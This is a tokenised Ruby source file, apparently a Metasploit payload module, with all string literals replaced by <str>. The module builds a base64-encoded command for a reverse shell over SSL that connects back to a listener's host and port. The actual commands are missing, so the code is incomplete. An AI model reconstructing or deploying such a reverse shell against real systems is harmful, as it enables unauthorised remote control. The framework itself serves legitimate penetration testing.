require <str> require <str> require <str> require <str> module Metasploit3 CachedSize = <int> include Msf :: Payload :: Single include Msf :: Sessions :: CommandShellOptions def initialize ( info = { } ) super ( merge_info ( info , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > BSD_LICENSE , <str> = > <str> , <str> = > ARCH_CMD , <str> = > Msf :: Handler :: ReverseTcpSsl , <str> = > Msf :: Sessions :: CommandShell , <str> = > <str> , <str> = > <str> , <str> = > { <str> = > { } , <str> = > <str> } ) ) end def generate vprint_good ( command_string ) return super + command_string end def command_string cmd = <str> dead = Rex :: Text . rand_text_alpha ( <int> ) cmd += <str> cmd += <str> cmd += <str> datastore [ <str> ] <str> datastore [ <str> ] <str> cmd += <str> cmd += <str> dead <str> cmd += <str> dead <str> cmd += <str> cmd += <str> dead <str> cmd += <str> cmd += <str> cmd += <str> cmd = <str> Rex :: Text . encode_base64 ( cmd ) <str> cmd += <str> return cmd end end 
